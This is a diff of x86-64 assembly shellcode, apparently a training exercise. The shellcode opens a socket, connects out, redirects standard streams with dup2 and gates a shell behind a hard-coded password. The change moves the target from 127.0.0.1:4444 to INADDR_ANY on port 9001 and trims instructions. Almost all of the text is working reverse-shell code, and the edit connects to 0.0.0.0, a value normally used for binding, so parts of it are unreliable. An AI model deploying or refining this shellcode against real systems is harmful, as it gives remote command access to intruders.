@@ -14,48 +14,55 @@ main:
 	; SOCK_STREAM = 1
 	; syscall number 41 
 
+        xor rsi, rsi
+        mul rsi
 
-	mov al, 41
-	mov dil, 2
-	mov sil, 1
-	xor rdx, rdx 
+	add rax, 41
+        push byte 0x2
+	pop rdi
+	inc rsi
+	;xor rdx, rdx 
 	syscall
 
 	; copy socket descriptor to rdi for future use 
 
-	mov rdi, rax
+	xchg rdi, rax
 
 
 	; server.sin_family = AF_INET 
 	; server.sin_port = htons(PORT)
-	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
+	; server.sin_addr.s_addr = INADDR_ANY
 	; bzero(&server.sin_zero, 8)
 
 	xor rax, rax 
 
-	push rax
-	
-	mov dword [rsp-4], 0x0201017f
-	mov word [rsp-6], 0x5c11
-	mov byte [rsp-8], 0x2
-	sub rsp, 8      ; align stack
+        push rax                ; pushing 0.0.0.0 into in_addr
+        push word 0x2923        ;little endian -> 9001 = 0x2329
+                                ; byte first ... 0x115C is 4444)
+        push word 0x2           ; AF_INET - which is 0x02
+
+        mov rsi, rsp            ; moving stack address to rsi
 
 
 	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
 	
-	mov al, 42
+	xor rax, rax
+	mov rdx, rax
+	add rax, 42
 	mov rsi, rsp
-	mov dl, 16
+	add rdx, 16
 	syscall
 
 
         ; duplicate sockets
 
         ; dup2 (new, old)
-        
+
+        xor rax, rax
 	mov al, 33
         xor rsi, rsi
         syscall
+
 
         mov al, 33
         inc rsi
@@ -101,17 +108,17 @@ main:
         mov rdi, rsp
         xor rsi, rsi
         push rsi
-        mov rsi, 0x646f6f6f676f6e6f
+        mov rsi, 0x0a646f6f676f6e6f ; \ndoogono  --> \n - new line byte = 0x0a
         push rsi
-        mov rsi, 0x7470756d61697461
+        mov rsi, 0x7470756d61697461 ; tpumaita
         push rsi
-        mov rsi, 0x6874726165777379
+        mov rsi, 0x6874726165777379 ; htraewsy
         push rsi
-        mov rsi, 0x6c6e6d656c6f7369
+        mov rsi, 0x6c6e6d656c6f7369 ; lnmelosi
         push rsi
-        mov rsi, rsp    ; password buffer pointer
+        mov rsi, rsp                ; password buffer pointer
         xor rcx, rcx
-        add cl, 32
+        add rcx, 32                 ; 31 bytes for password and 1 byte for newline char
         repe cmpsb
         jne password
 
